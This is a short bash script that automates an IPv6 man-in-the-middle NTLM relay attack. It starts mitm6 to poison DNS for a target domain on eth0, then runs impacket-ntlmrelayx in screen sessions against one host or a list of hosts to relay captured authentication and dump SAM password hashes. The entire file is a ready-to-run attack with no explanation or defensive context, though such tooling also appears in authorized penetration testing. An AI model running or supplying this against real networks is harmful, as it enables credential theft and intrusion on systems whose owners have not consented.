#!/bin/bash
screen -S mitm6 -d -m  sudo mitm6 -i eth0 -d "$1"
if [ -f "$2" ]; then
    screen -S relay_ipv6 -m sudo impacket-ntlmrelayx -of SAMhashes -6 -tf "$2" -socks -smb2support
else
    screen -S relay_ipv6 -m sudo impacket-ntlmrelayx  -of SAMHashes -t "$2" -smb2support
fi
